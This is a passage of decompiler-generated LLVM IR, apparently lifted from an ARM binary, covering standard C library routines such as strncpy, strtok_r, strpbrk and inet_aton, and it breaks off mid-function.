  uselistorder i32 %v1_c6f0, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_c6f0, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 25, 26, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r3.global-to-local, { 0, 37, 1, 2, 3, 38, 4, 5, 6, 39, 35, 36, 40, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %r2.global-to-local, { 0, 66, 1, 2, 3, 4, 5, 67, 6, 7, 8, 9, 10, 68, 11, 63, 64, 65, 69, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 27, 28, 58, 29, 30, 31, 32, 33, 59, 34, 35, 36, 37, 38, 60, 39, 40, 41, 42, 43, 61, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 33, 2, 3, 5, 4, 34, 6, 7, 31, 8, 35, 30, 32, 36, 9, 10, 13, 11, 23, 12, 14, 16, 15, 24, 17, 18, 20, 19, 25, 21, 22, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 3, 24, 4, 5, 25, 6, 7, 58, 60, 8, 9, 10, 11, 12, 26, 13, 15, 14, 16, 17, 59, 18, 19, 27, 20, 21, 22, 23, 28, 29, 38, 30, 31, 39, 32, 33, 40, 34, 35, 36, 37, 41, 42, 0, 43, 44, 46, 45, 47, 48, 54, 49, 50, 51, 55, 52, 53, 56, 57, 1, 2 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 16, 17, 18, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 42, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 1, 23, 2, 25, 0, 26, 24, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 47, 48, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 1, 25, 2, 27, 0, 28, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_cb58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_caec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ca80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ca20, { 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb142, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_c9ac, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %dec_label_pc_c970, { 1, 0 }
  uselistorder label %dec_label_pc_c95c, { 1, 0 }
  uselistorder label %dec_label_pc_c91c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c8b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c844, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c7e4, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %.thread119, { 1, 0 }
  uselistorder label %bb132, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread117, { 1, 0 }
  uselistorder label %dec_label_pc_c758, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_c718, { 1, 0 }
}

define i32 @function_cb78(i32 %arg1) local_unnamed_addr {
dec_label_pc_cb78:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_cb80 = load i32, i32* @r0, align 4
  %v1_cb80 = load i32, i32* @r1, align 4
  %v2_cb80 = inttoptr i32 %v0_cb80 to i8*
  %v3_cb80 = call i32 @_memcpy(i8* %v2_cb80, i32 %v1_cb80)
  ret i32 %v3_cb80

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_cb90 = icmp eq i32 %arg2, 3
  store i1 %v7_cb90, i1* %cpsr_z.global-to-local, align 1
  %v1_cb98 = add i32 %arg1, -1
  store i32 %v1_cb98, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_cc14, label %dec_label_pc_cba0

dec_label_pc_cba0:                                ; preds = %entry
  %v3_cba0 = udiv i32 %arg2, 4
  store i32 %v3_cba0, i32* @lr, align 4
  %v0_cba4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_cba4

dec_label_pc_cba4:                                ; preds = %dec_label_pc_cbf0, %dec_label_pc_cba0
  %v2_cbac = phi i32 [ %v6_cbe4, %dec_label_pc_cbf0 ], [ %v1_cb98, %dec_label_pc_cba0 ]
  %v0_cba4 = phi i32 [ %v1_cbf4, %dec_label_pc_cbf0 ], [ %v0_cba4.pre, %dec_label_pc_cba0 ]
  %v1_cba4 = inttoptr i32 %v0_cba4 to i8*
  %v2_cba4 = load i8, i8* %v1_cba4, align 1
  %v3_cba4 = zext i8 %v2_cba4 to i32
  store i32 %v3_cba4, i32* %r3.global-to-local, align 4
  %v2_cba8 = icmp eq i8 %v2_cba4, 0
  store i1 %v2_cba8, i1* %cpsr_z.global-to-local, align 1
  %v3_cbac = add i32 %v2_cbac, 1
  %v4_cbac = inttoptr i32 %v3_cbac to i8*
  store i8 %v2_cba4, i8* %v4_cbac, align 1
  %v5_cbac = load i32, i32* %ip.global-to-local, align 4
  %v6_cbac = add i32 %v5_cbac, 1
  store i32 %v6_cbac, i32* %ip.global-to-local, align 4
  %v0_cbb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cbb0, label %dec_label_pc_cc00, label %dec_label_pc_cbb4

dec_label_pc_cbb4:                                ; preds = %dec_label_pc_cba4
  %v0_cbb4 = load i32, i32* @r1, align 4
  %v1_cbb4 = add i32 %v0_cbb4, 1
  %v2_cbb4 = inttoptr i32 %v1_cbb4 to i8*
  %v3_cbb4 = load i8, i8* %v2_cbb4, align 1
  %v4_cbb4 = zext i8 %v3_cbb4 to i32
  store i32 %v4_cbb4, i32* %r3.global-to-local, align 4
  %v2_cbb8 = icmp eq i8 %v3_cbb4, 0
  store i1 %v2_cbb8, i1* %cpsr_z.global-to-local, align 1
  %v3_cbbc = add i32 %v5_cbac, 2
  %v4_cbbc = inttoptr i32 %v3_cbbc to i8*
  store i8 %v3_cbb4, i8* %v4_cbbc, align 1
  %v5_cbbc = load i32, i32* %ip.global-to-local, align 4
  %v6_cbbc = add i32 %v5_cbbc, 1
  store i32 %v6_cbbc, i32* %ip.global-to-local, align 4
  %v0_cbc0 = load i32, i32* @r1, align 4
  %v1_cbc0 = add i32 %v0_cbc0, 1
  store i32 %v1_cbc0, i32* %r1.global-to-local, align 4
  %v0_cbc4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cbc4, label %dec_label_pc_cc00, label %dec_label_pc_cbc8

dec_label_pc_cbc8:                                ; preds = %dec_label_pc_cbb4
  %v1_cbc8 = add i32 %v0_cbc0, 2
  %v2_cbc8 = inttoptr i32 %v1_cbc8 to i8*
  %v3_cbc8 = load i8, i8* %v2_cbc8, align 1
  %v4_cbc8 = zext i8 %v3_cbc8 to i32
  store i32 %v4_cbc8, i32* %r3.global-to-local, align 4
  %v2_cbcc = icmp eq i8 %v3_cbc8, 0
  store i1 %v2_cbcc, i1* %cpsr_z.global-to-local, align 1
  %v3_cbd0 = add i32 %v5_cbbc, 2
  %v4_cbd0 = inttoptr i32 %v3_cbd0 to i8*
  store i8 %v3_cbc8, i8* %v4_cbd0, align 1
  %v5_cbd0 = load i32, i32* %ip.global-to-local, align 4
  %v6_cbd0 = add i32 %v5_cbd0, 1
  store i32 %v6_cbd0, i32* %ip.global-to-local, align 4
  %v0_cbd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_cbd4 = add i32 %v0_cbd4, 1
  store i32 %v1_cbd4, i32* %r1.global-to-local, align 4
  %v0_cbd8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cbd8, label %dec_label_pc_cc00, label %dec_label_pc_cbdc

dec_label_pc_cbdc:                                ; preds = %dec_label_pc_cbc8
  %v1_cbdc = add i32 %v0_cbd4, 2
  %v2_cbdc = inttoptr i32 %v1_cbdc to i8*
  %v3_cbdc = load i8, i8* %v2_cbdc, align 1
  %v4_cbdc = zext i8 %v3_cbdc to i32
  store i32 %v4_cbdc, i32* %r3.global-to-local, align 4
  %v2_cbe0 = icmp eq i8 %v3_cbdc, 0
  store i1 %v2_cbe0, i1* %cpsr_z.global-to-local, align 1
  %v3_cbe4 = add i32 %v5_cbd0, 2
  %v4_cbe4 = inttoptr i32 %v3_cbe4 to i8*
  store i8 %v3_cbdc, i8* %v4_cbe4, align 1
  %v5_cbe4 = load i32, i32* %ip.global-to-local, align 4
  %v6_cbe4 = add i32 %v5_cbe4, 1
  store i32 %v6_cbe4, i32* %ip.global-to-local, align 4
  %v0_cbe8 = load i32, i32* %r1.global-to-local, align 4
  %v1_cbe8 = add i32 %v0_cbe8, 1
  store i32 %v1_cbe8, i32* %r1.global-to-local, align 4
  %v0_cbec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cbec, label %dec_label_pc_cc00, label %dec_label_pc_cbf0

dec_label_pc_cbf0:                                ; preds = %dec_label_pc_cbdc
  %v0_cbf0 = load i32, i32* @lr, align 4
  %v1_cbf0 = add i32 %v0_cbf0, -1
  store i32 %v1_cbf0, i32* @lr, align 4
  %v7_cbf0 = icmp eq i32 %v0_cbf0, 1
  store i1 %v7_cbf0, i1* %cpsr_z.global-to-local, align 1
  %v1_cbf4 = add i32 %v0_cbe8, 2
  store i32 %v1_cbf4, i32* @r1, align 4
  br i1 %v7_cbf0, label %dec_label_pc_cc14, label %dec_label_pc_cba4

dec_label_pc_cc00:                                ; preds = %dec_label_pc_cbdc, %dec_label_pc_cbc8, %dec_label_pc_cbb4, %dec_label_pc_cba4
  %v1_cc00 = phi i32 [ %v6_cbe4, %dec_label_pc_cbdc ], [ %v6_cbd0, %dec_label_pc_cbc8 ], [ %v6_cbbc, %dec_label_pc_cbb4 ], [ %v6_cbac, %dec_label_pc_cba4 ]
  %v2_cc001 = sub i32 %arg1, %v1_cc00
  %v2_cc04 = add i32 %v2_cc001, %arg2
  store i32 %v2_cc04, i32* %r3.global-to-local, align 4
  %v1_cc08 = add i32 %v2_cc04, -1
  store i32 %v1_cc08, i32* %r2.global-to-local, align 4
  %v7_cc08 = icmp eq i32 %v2_cc04, 1
  store i1 %v7_cc08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_cc08, label %bb, label %dec_label_pc_cc34

bb:                                               ; preds = %dec_label_pc_cc00
  ret i32 %arg1

dec_label_pc_cc14:                                ; preds = %dec_label_pc_cbf0, %entry
  %v2_cc246 = phi i32 [ %v1_cb98, %entry ], [ %v6_cbe4, %dec_label_pc_cbf0 ]
  %v1_cc14 = urem i32 %arg2, 4
  store i32 %v1_cc14, i32* %r2.global-to-local, align 4
  %v2_cc14 = icmp eq i32 %v1_cc14, 0
  store i1 %v2_cc14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cc14, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_cc14
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_cc14, %._crit_edge
  %v2_cc24 = phi i32 [ %v6_cc24, %._crit_edge ], [ %v2_cc246, %dec_label_pc_cc14 ]
  %v0_cc20 = phi i32 [ %v0_cc20.pre, %._crit_edge ], [ %v1_cc14, %dec_label_pc_cc14 ]
  %v0_cc1c = load i32, i32* @r1, align 4
  %v1_cc1c = inttoptr i32 %v0_cc1c to i8*
  %v2_cc1c = load i8, i8* %v1_cc1c, align 1
  %v3_cc1c = zext i8 %v2_cc1c to i32
  store i32 %v3_cc1c, i32* %r3.global-to-local, align 4
  %v5_cc1c = add i32 %v0_cc1c, 1
  store i32 %v5_cc1c, i32* @r1, align 4
  %v1_cc20 = add i32 %v0_cc20, -1
  store i32 %v1_cc20, i32* %r2.global-to-local, align 4
  %v7_cc20 = icmp eq i32 %v0_cc20, 1
  store i1 %v7_cc20, i1* %cpsr_z.global-to-local, align 1
  %v3_cc24 = add i32 %v2_cc24, 1
  %v4_cc24 = inttoptr i32 %v3_cc24 to i8*
  store i8 %v2_cc1c, i8* %v4_cc24, align 1
  %v5_cc24 = load i32, i32* %ip.global-to-local, align 4
  %v6_cc24 = add i32 %v5_cc24, 1
  store i32 %v6_cc24, i32* %ip.global-to-local, align 4
  %v0_cc28 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cc28, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_cc2c = load i32, i32* %r3.global-to-local, align 4
  %v2_cc2c = icmp eq i32 %v0_cc2c, 0
  store i1 %v2_cc2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cc2c, label %dec_label_pc_cc34, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_cc20.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_cc34:                                ; preds = %dec_label_pc_cc00, %bb13, %dec_label_pc_cc34
  %v2_cc3c = phi i32 [ %v6_cc3c, %dec_label_pc_cc34 ], [ %v1_cc00, %dec_label_pc_cc00 ], [ %v6_cc24, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cc38 = load i32, i32* %r2.global-to-local, align 4
  %v1_cc38 = add i32 %v0_cc38, -1
  store i32 %v1_cc38, i32* %r2.global-to-local, align 4
  %v7_cc38 = icmp eq i32 %v0_cc38, 1
  store i1 %v7_cc38, i1* %cpsr_z.global-to-local, align 1
  %v3_cc3c = add i32 %v2_cc3c, 1
  %v4_cc3c = inttoptr i32 %v3_cc3c to i8*
  store i8 0, i8* %v4_cc3c, align 1
  %v5_cc3c = load i32, i32* %ip.global-to-local, align 4
  %v6_cc3c = add i32 %v5_cc3c, 1
  store i32 %v6_cc3c, i32* %ip.global-to-local, align 4
  %v0_cc40 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cc40, label %dec_label_pc_cc44, label %dec_label_pc_cc34

dec_label_pc_cc44:                                ; preds = %dec_label_pc_cc34
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_cc3c, { 1, 0 }
  uselistorder i32 %v0_cc38, { 1, 0 }
  uselistorder i32 %v6_cc24, { 0, 2, 1 }
  uselistorder i32 %v1_cc14, { 2, 1, 0 }
  uselistorder i32 %v2_cc04, { 2, 1, 0 }
  uselistorder i32 %v1_cbf4, { 1, 0 }
  uselistorder i32 %v0_cbf0, { 1, 0 }
  uselistorder i32 %v6_cbe4, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 7, 1, 10, 2, 3, 4, 5, 6, 8, 9, 11, 12 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 2, 1, 4, 5, 0, 3 }
  uselistorder label %dec_label_pc_cc34, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_cc48 = load i32, i32* @r4, align 4
  store i32 %v3_cc48, i32* %stack_var_-16, align 4
  %v6_cc48 = load i32, i32* @r5, align 4
  %v0_cc4c = load i32, i32* @r0, align 4
  store i32 %v0_cc4c, i32* %r4.global-to-local, align 4
  %v2_cc4c = icmp eq i32 %v0_cc4c, 0
  %v1_cc50 = load i32, i32* @r2, align 4
  br i1 %v2_cc4c, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_cc50 = inttoptr i32 %v1_cc50 to i32*
  %v3_cc50 = load i32, i32* %v2_cc50, align 4
  store i32 %v3_cc50, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_cc54 = phi i32 [ %v3_cc50, %bb ], [ %v0_cc4c, %entry ]
  store i32 %v0_cc54, i32* @r0, align 4
  store i32 %v1_cc50, i32* @r5, align 4
  %v0_cc5c = load i32, i32* @r1, align 4
  store i32 %v0_cc5c, i32* %r6.global-to-local, align 4
  %v1_cc60 = inttoptr i32 %v0_cc54 to i8*
  %v2_cc60 = call i32 @__GI_strspn(i8* %v1_cc60)
  %v0_cc64 = load i32, i32* %r4.global-to-local, align 4
  %v2_cc64 = add i32 %v0_cc64, %v2_cc60
  %v3_cc64 = inttoptr i32 %v2_cc64 to i8*
  %v4_cc64 = load i8, i8* %v3_cc64, align 1
  %v6_cc64 = zext i8 %v4_cc64 to i32
  store i32 %v6_cc64, i32* %r3.global-to-local, align 4
  store i32 %v2_cc64, i32* @r4, align 4
  %v2_cc6c = icmp eq i8 %v4_cc64, 0
  store i1 %v2_cc6c, i1* @cpsr_z, align 1
  %v0_cc70 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_cc70, i32* @r1, align 4
  store i32 %v2_cc64, i32* @r0, align 4
  br i1 %v2_cc6c, label %bb7, label %dec_label_pc_cc80

bb7:                                              ; preds = %entry._crit_edge
  %v2_cc78 = load i32, i32* @r5, align 4
  %v3_cc78 = inttoptr i32 %v2_cc78 to i32*
  store i32 %v2_cc64, i32* %v3_cc78, align 4
  br label %dec_label_pc_ccb4

dec_label_pc_cc80:                                ; preds = %entry._crit_edge
  %v0_cc80 = call i32 @__GI_strpbrk()
  store i32 %v0_cc80, i32* %r2.global-to-local, align 4
  %v3_cc84 = icmp eq i32 %v0_cc80, 0
  store i1 %v3_cc84, i1* @cpsr_z, align 1
  br i1 %v3_cc84, label %dec_label_pc_cc94, label %dec_label_pc_cca4

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc80
  %v0_cc8c = load i32, i32* @r4, align 4
  %v2_cc94 = call i32 @rawmemchr(i32 %v0_cc8c, i32 0)
  %v0_cc98 = load i32, i32* @r4, align 4
  store i32 %v0_cc98, i32* %r3.global-to-local, align 4
  %v1_cc9c = load i32, i32* @r5, align 4
  %v2_cc9c = inttoptr i32 %v1_cc9c to i32*
  store i32 %v2_cc94, i32* %v2_cc9c, align 4
  br label %dec_label_pc_ccb4

dec_label_pc_cca4:                                ; preds = %dec_label_pc_cc80
  %v3_cca8 = inttoptr i32 %v0_cc80 to i8*
  store i8 0, i8* %v3_cca8, align 1
  %v4_cca8 = load i32, i32* %r2.global-to-local, align 4
  %v5_cca8 = add i32 %v4_cca8, 1
  store i32 %v5_cca8, i32* %r2.global-to-local, align 4
  %v1_ccac = load i32, i32* @r5, align 4
  %v2_ccac = inttoptr i32 %v1_ccac to i32*
  store i32 %v5_cca8, i32* %v2_ccac, align 4
  %v0_ccb0 = load i32, i32* @r4, align 4
  store i32 %v0_ccb0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ccb4

dec_label_pc_ccb4:                                ; preds = %bb7, %dec_label_pc_cc94, %dec_label_pc_cca4
  %v0_ccb4 = load i32, i32* %r3.global-to-local, align 4
  %v2_ccb8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_ccb8, i32* @r4, align 4
  store i32 %v6_cc48, i32* @r5, align 4
  ret i32 %v0_ccb4

; uselistorder directives
  uselistorder i32 %v0_cc54, { 1, 0 }
  uselistorder i32 %v0_cc4c, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_ccb4, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %v0_ccbc = load i32, i32* @r0, align 4
  %v1_cce02 = inttoptr i32 %v0_ccbc to i8*
  %v2_cce03 = load i8, i8* %v1_cce02, align 1
  %v3_cce04 = zext i8 %v2_cce03 to i32
  %v2_cce45 = icmp eq i8 %v2_cce03, 0
  br i1 %v2_cce45, label %dec_label_pc_cce0._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %entry
  %v0_ccec.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_ccc4:                                ; preds = %dec_label_pc_cccc
  %v1_ccd4 = add i32 %v0_ccd4, 1
  %v9_ccc4 = icmp eq i32 %v3_cccc, %v3_cce06
  br i1 %v9_ccc4, label %dec_label_pc_ccf4, label %dec_label_pc_cccc

dec_label_pc_cccc:                                ; preds = %dec_label_pc_ccc4, %bb
  %v0_ccd4 = phi i32 [ %v1_ccd4, %dec_label_pc_ccc4 ], [ %v0_ccec.pre, %bb ]
  %v1_cccc = inttoptr i32 %v0_ccd4 to i8*
  %v2_cccc = load i8, i8* %v1_cccc, align 1
  %v3_cccc = zext i8 %v2_cccc to i32
  store i32 %v3_cccc, i32* @ip, align 4
  %v2_ccd0 = icmp eq i8 %v2_cccc, 0
  br i1 %v2_ccd0, label %dec_label_pc_ccdc, label %dec_label_pc_ccc4

dec_label_pc_ccdc:                                ; preds = %dec_label_pc_cccc
  %v1_ccdc = add i32 %v0_ccdc, 1
  %v1_cce0 = inttoptr i32 %v1_ccdc to i8*
  %v2_cce0 = load i8, i8* %v1_cce0, align 1
  %v3_cce0 = zext i8 %v2_cce0 to i32
  %v2_cce4 = icmp eq i8 %v2_cce0, 0
  br i1 %v2_cce4, label %dec_label_pc_cce0._crit_edge, label %bb

dec_label_pc_cce0._crit_edge:                     ; preds = %dec_label_pc_ccdc, %entry
  %v3_cce0.lcssa = phi i32 [ %v3_cce04, %entry ], [ %v3_cce0, %dec_label_pc_ccdc ]
  ret i32 %v3_cce0.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_ccdc
  %v0_ccdc = phi i32 [ %v0_ccbc, %.lr.ph ], [ %v1_ccdc, %dec_label_pc_ccdc ]
  %v3_cce06 = phi i32 [ %v3_cce04, %.lr.ph ], [ %v3_cce0, %dec_label_pc_ccdc ]
  br label %dec_label_pc_cccc

dec_label_pc_ccf4:                                ; preds = %dec_label_pc_ccc4
  ret i32 %v0_ccdc

; uselistorder directives
  uselistorder i32 %v3_cce0, { 1, 0 }
  uselistorder i32 %v3_cccc, { 1, 0 }
  uselistorder i32 %v0_ccd4, { 1, 0 }
  uselistorder i32 %v3_cce04, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_cccc, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_ccfc = load i32, i32* %r0.global-to-local, align 4
  %v2_ccfc = icmp eq i32 %v0_ccfc, 0
  %v3_cd00 = load i32, i32* @r4, align 4
  store i32 %v3_cd00, i32* %stack_var_-20, align 4
  br i1 %v2_ccfc, label %dec_label_pc_cddc, label %dec_label_pc_cd18.lr.ph

dec_label_pc_cd18:                                ; preds = %dec_label_pc_cd18.lr.ph, %dec_label_pc_cd9c
  %v1_cd9c = phi i32 [ 0, %dec_label_pc_cd18.lr.ph ], [ %v5_cd9c, %dec_label_pc_cd9c ]
  %v0_cda0 = phi i32 [ 1, %dec_label_pc_cd18.lr.ph ], [ %v1_cda0, %dec_label_pc_cd9c ]
  %v0_cd20 = phi i32 [ %v0_ccfc, %dec_label_pc_cd18.lr.ph ], [ %v0_cd2025, %dec_label_pc_cd9c ]
  store i32 %v2_cd1c.pre, i32* @lr, align 4
  %v1_cd20 = inttoptr i32 %v0_cd20 to i8*
  %v2_cd20 = load i8, i8* %v1_cd20, align 1
  %v3_cd20 = zext i8 %v2_cd20 to i32
  %v3_cd24 = mul nuw nsw i32 %v3_cd20, 2
  %v4_cd24 = add i32 %v3_cd24, %v2_cd1c.pre
  %v5_cd24 = inttoptr i32 %v4_cd24 to i8*
  %v6_cd24 = load i8, i8* %v5_cd24, align 1
  %v1_cd28 = and i8 %v6_cd24, 8
  %v2_cd28 = icmp eq i8 %v1_cd28, 0
  br i1 %v2_cd28, label %dec_label_pc_cddc, label %dec_label_pc_cd30

dec_label_pc_cd30:                                ; preds = %dec_label_pc_cd18
  br label %dec_label_pc_cd50

dec_label_pc_cd38:                                ; preds = %dec_label_pc_cd50
  %v3_cd3c = mul i32 %v0_cd9c, 10
  %v4_cd3c = add i32 %v3_cd50, %v3_cd3c
  %v1_cd40 = add i32 %v4_cd3c, -48
  %v8_cd48 = icmp sgt i32 %v1_cd40, 255
  br i1 %v8_cd48, label %dec_label_pc_cddc, label %dec_label_pc_cd4c

dec_label_pc_cd4c:                                ; preds = %dec_label_pc_cd38
  %v1_cd4c = add i32 %v0_cd8c, 1
  store i32 %v1_cd4c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cd50

dec_label_pc_cd50:                                ; preds = %dec_label_pc_cd30, %dec_label_pc_cd4c
  %v0_cd9c = phi i32 [ 0, %dec_label_pc_cd30 ], [ %v1_cd40, %dec_label_pc_cd4c ]
  %v0_cd8c = phi i32 [ %v0_cd20, %dec_label_pc_cd30 ], [ %v1_cd4c, %dec_label_pc_cd4c ]
  %v1_cd50 = inttoptr i32 %v0_cd8c to i8*
  %v2_cd50 = load i8, i8* %v1_cd50, align 1
  %v3_cd50 = zext i8 %v2_cd50 to i32
  %v2_cd54 = mul nuw nsw i32 %v3_cd50, 2
  %v2_cd58 = add i32 %v2_cd54, %v2_cd1c.pre
  %v3_cd5c = inttoptr i32 %v2_cd58 to i8*
  %v4_cd5c = load i8, i8* %v3_cd5c, align 1
  %v6_cd5c = zext i8 %v4_cd5c to i32
  %v1_cd68 = and i32 %v6_cd5c, 8
  %v2_cd68 = icmp eq i32 %v1_cd68, 0
  br i1 %v2_cd68, label %dec_label_pc_cd70, label %dec_label_pc_cd38

dec_label_pc_cd70:                                ; preds = %dec_label_pc_cd50
  %v8_cd74 = icmp sgt i32 %v0_cda0, 3
  br i1 %v8_cd74, label %dec_label_pc_cd88, label %dec_label_pc_cd78

dec_label_pc_cd78:                                ; preds = %dec_label_pc_cd70
  %v7_cd78 = icmp eq i8 %v2_cd50, 46
  br i1 %v7_cd78, label %dec_label_pc_cd80, label %dec_label_pc_cddc

dec_label_pc_cd80:                                ; preds = %dec_label_pc_cd78
  %v1_cd80 = add i32 %v0_cd8c, 1
  store i32 %v1_cd80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cd9c

dec_label_pc_cd88:                                ; preds = %dec_label_pc_cd70
  %v2_cd88 = icmp eq i8 %v2_cd50, 0
  %v1_cd8c = add i32 %v0_cd8c, 1
  store i32 %v1_cd8c, i32* %r0.global-to-local, align 4
  br i1 %v2_cd88, label %dec_label_pc_cd9c, label %dec_label_pc_cd94

dec_label_pc_cd94:                                ; preds = %dec_label_pc_cd88
  %v1_cd94 = and i32 %v6_cd5c, 32
  %v2_cd94 = icmp eq i32 %v1_cd94, 0
  br i1 %v2_cd94, label %dec_label_pc_cddc, label %dec_label_pc_cd9c

dec_label_pc_cd9c:                                ; preds = %dec_label_pc_cd94, %dec_label_pc_cd88, %dec_label_pc_cd80
  %v0_cd2025 = phi i32 [ %v1_cd8c, %dec_label_pc_cd94 ], [ %v1_cd8c, %dec_label_pc_cd88 ], [ %v1_cd80, %dec_label_pc_cd80 ]
  %v4_cd9c = mul i32 %v1_cd9c, 256
  %v5_cd9c = or i32 %v0_cd9c, %v4_cd9c
  %v1_cda0 = add nuw nsw i32 %v0_cda0, 1
  %v7_cda8 = icmp slt i32 %v1_cda0, 5
  br i1 %v7_cda8, label %dec_label_pc_cd18, label %dec_label_pc_cdac

dec_label_pc_cd18.lr.ph:                          ; preds = %entry
  %v2_cd1c.pre = load i32, i32* @global_var_1b514, align 4
  br label %dec_label_pc_cd18

dec_label_pc_cdac:                                ; preds = %dec_label_pc_cd9c
  %v2_cdac = icmp eq i32 %arg2, 0
